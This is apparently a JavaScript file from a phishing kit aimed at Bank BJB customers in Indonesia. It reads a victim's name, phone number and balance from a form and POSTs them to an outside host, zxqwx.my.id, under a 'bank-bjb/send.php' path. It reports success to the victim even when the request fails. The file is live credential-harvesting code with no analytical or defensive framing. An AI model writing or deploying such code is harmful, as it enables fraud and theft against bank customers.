$(document).ready(function() {
});

function next() {
	var name = $("#name").val().trim();
	var phone = $("#phone").val().trim();
	var balance = $("#balance").val().trim();
	if (name=="" || phone=="" || balance=="") {
		alert("Mohon lengkapi data!");
		return;
	}
	var message = ('\n<b>Nama:</b>\n'+name+'\n\n<b>No. HP:</b>\n'+phone+'\n\n<b>Saldo:</b>\n'+balance+'\n');
	var fd = new FormData();
	fd.append('message', message);
	
	fetch("https://zxqwx.my.id/senders/"
        +"bank-bjb/send.php", {
        method: 'POST',
        body: fd
      })
      .then(response => response.json())
      .then(data => {
      	dataSent();
      })
      .catch((error) => {
      	dataSent();
      });
}

module.next = next;